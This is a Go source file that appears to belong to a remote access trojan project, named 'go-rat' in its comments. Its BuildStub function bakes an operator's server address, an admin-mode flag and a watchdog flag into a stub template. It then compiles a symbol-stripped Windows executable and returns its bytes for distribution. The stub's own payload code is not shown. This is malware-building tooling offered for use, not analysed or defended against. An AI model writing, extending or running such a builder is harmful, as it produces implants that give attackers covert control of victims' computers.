package builder

import (
	"bufio"
	"bytes"
	"fmt"
	"html/template"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// StubBuildConfig holds parameters for building a stub
type StubBuildConfig struct {
	ServerAddress  string
	EnableAdmin    bool
	EnableWatchdog bool
	StubModuleName string // Module name from stub's go.mod
	// RootModulePath string // Module path of the main go-rat project if needed for common packages
}

// parseModuleName extracts the module name from a go.mod file.
func parseModuleName(goModPath string) (string, error) {
	file, err := os.Open(goModPath)
	if err != nil {
		return "", fmt.Errorf("failed to open go.mod file at %s: %w", goModPath, err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "module ") {
			return strings.TrimPrefix(line, "module "), nil
		}
	}
	if err := scanner.Err(); err != nil {
		return "", fmt.Errorf("error reading go.mod file %s: %w", goModPath, err)
	}
	return "", fmt.Errorf("module directive not found in go.mod file %s", goModPath)
}

// copyDir recursively copies a directory from src to dst.
func copyDir(src, dst string) error {
	err := os.MkdirAll(dst, 0755)
	if err != nil {
		return fmt.Errorf("failed to create destination directory %s: %w", dst, err)
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return fmt.Errorf("failed to read source directory %s: %w", src, err)
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			err = copyDir(srcPath, dstPath)
			if err != nil {
				return err // Error already contains context
			}
		} else {
			err = copyFile(srcPath, dstPath)
			if err != nil {
				return err // Error already contains context
			}
		}
	}
	return nil
}

// copyFile copies a single file from src to dst.
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("failed to open source file %s: %w", src, err)
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("failed to create destination file %s: %w", dst, err)
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return fmt.Errorf("failed to copy file content from %s to %s: %w", src, dst, err)
	}
	return nil
}

// BuildStub generates a stub executable with the given parameters.
func BuildStub(serverIP, serverPort string, adminMode, enableWatchdog bool) ([]byte, error) {
	log.Println("Starting stub build process...")

	// Determine project root dynamically (assuming builder.go is in internal/builder)
	// ../../ should be the go-rat project root from internal/builder/builder.go
	projectRoot, err := filepath.Abs(filepath.Join("..", ".."))
	if err != nil {
		return nil, fmt.Errorf("failed to determine project root: %w", err)
	}
	log.Printf("Project root determined as: %s", projectRoot)


	// --- 1. Parse Stub Module Name ---
	stubGoModPath := filepath.Join(projectRoot, "cmd", "stub", "go.mod")
	stubModuleName, err := parseModuleName(stubGoModPath)
	if err != nil {
		return nil, fmt.Errorf("failed to parse stub module name: %w", err)
	}
	log.Printf("Stub module name: %s", stubModuleName)

	config := StubBuildConfig{
		ServerAddress:  fmt.Sprintf("wss://%s:%s/ws", serverIP, serverPort),
		EnableAdmin:    adminMode,
		EnableWatchdog: enableWatchdog,
		StubModuleName: stubModuleName,
	}

	// --- 2. Create Temporary Build Directory ---
	tempDir, err := os.MkdirTemp("", "stub_build_*")
	if err != nil {
		return nil, fmt.Errorf("failed to create temporary build directory: %w", err)
	}
	log.Printf("Temporary build directory created: %s", tempDir)
	defer func() {
		log.Printf("Cleaning up temporary build directory: %s", tempDir)
		if err := os.RemoveAll(tempDir); err != nil {
			log.Printf("Error removing temporary directory %s: %v", tempDir, err)
		}
	}()

	// --- 3. Parse and Execute Template ---
	templatePath := filepath.Join(projectRoot, "internal", "builder", "stub_template.go_tpl")
	tmpl, err := template.ParseFiles(templatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to parse stub template file %s: %w", templatePath, err)
	}

	generatedMainGoPath := filepath.Join(tempDir, "main.go")
	mainGoFile, err := os.Create(generatedMainGoPath)
	if err != nil {
		return nil, fmt.Errorf("failed to create temporary main.go at %s: %w", generatedMainGoPath, err)
	}
	err = tmpl.Execute(mainGoFile, config)
	mainGoFile.Close() // Close before build
	if err != nil {
		return nil, fmt.Errorf("failed to execute template into %s: %w", generatedMainGoPath, err)
	}
	log.Printf("Generated main.go in temporary directory: %s", generatedMainGoPath)

	// --- 4. Copy Supporting Files and Directories ---
	// Copy go.mod and go.sum for the stub
	for _, file := range []string{"go.mod", "go.sum"} {
		src := filepath.Join(projectRoot, "cmd", "stub", file)
		dst := filepath.Join(tempDir, file)
		if err := copyFile(src, dst); err != nil {
			// go.sum might not exist, so only fail hard on go.mod
			if file == "go.mod" {
				return nil, fmt.Errorf("failed to copy %s: %w", file, err)
			}
			log.Printf("Could not copy %s (may not exist): %v", file, err)
		} else {
			log.Printf("Copied %s to %s", src, dst)
		}
	}

	// Copy internal/stub directory
	srcInternalStub := filepath.Join(projectRoot, "internal", "stub")
	dstInternalStub := filepath.Join(tempDir, "internal", "stub") // Path relative to stubModuleName
	if err := copyDir(srcInternalStub, dstInternalStub); err != nil {
		return nil, fmt.Errorf("failed to copy internal/stub: %w", err)
	}
	log.Printf("Copied internal/stub to %s", dstInternalStub)
	
	// Copy pkg/common directory
	srcPkgCommon := filepath.Join(projectRoot, "pkg", "common")
	dstPkgCommon := filepath.Join(tempDir, "pkg", "common") // Path relative to stubModuleName
	if err := copyDir(srcPkgCommon, dstPkgCommon); err != nil {
		return nil, fmt.Errorf("failed to copy pkg/common: %w", err)
	}
	log.Printf("Copied pkg/common to %s", dstPkgCommon)

	// Copy certs/cert.pem
	srcCert := filepath.Join(projectRoot, "certs", "cert.pem")
	dstCert := filepath.Join(tempDir, "cert.pem")
	if err := copyFile(srcCert, dstCert); err != nil {
		return nil, fmt.Errorf("failed to copy cert.pem: %w", err)
	}
	log.Printf("Copied certs/cert.pem to %s", dstCert)

	// --- 5. Run go mod tidy in Temporary Directory ---
	cmdModTidy := exec.Command("go", "mod", "tidy")
	cmdModTidy.Dir = tempDir
	var stderrModTidy bytes.Buffer
	cmdModTidy.Stderr = &stderrModTidy
	log.Printf("Running 'go mod tidy' in %s", tempDir)
	if err := cmdModTidy.Run(); err != nil {
		log.Printf("go mod tidy stderr: %s", stderrModTidy.String())
		return nil, fmt.Errorf("go mod tidy failed in %s: %w. Stderr: %s", tempDir, err, stderrModTidy.String())
	}
	log.Println("go mod tidy completed successfully.")

	// --- 6. Compile Go Code ---
	outputName := "stub.exe"
	outputPath := filepath.Join(tempDir, outputName)
	cmdBuild := exec.Command("go", "build", "-o", outputName, "-ldflags=-s -w", ".")
	cmdBuild.Dir = tempDir
	cmdBuild.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
	var stderrBuild bytes.Buffer
	cmdBuild.Stderr = &stderrBuild
	log.Printf("Running 'go build -o %s -ldflags=\"-s -w\" .' in %s with GOOS=windows GOARCH=amd64", outputName, tempDir)
	if err := cmdBuild.Run(); err != nil {
		log.Printf("go build stderr: %s", stderrBuild.String())
		return nil, fmt.Errorf("go build failed in %s: %w. Stderr: %s", tempDir, err, stderrBuild.String())
	}
	log.Printf("Go build successful. Executable: %s", outputPath)

	// --- 7. Read Compiled Executable ---
	executableBytes, err := os.ReadFile(outputPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read compiled executable %s: %w", outputPath, err)
	}
	log.Printf("Successfully read %d bytes from %s", len(executableBytes), outputPath)

	return executableBytes, nil
}
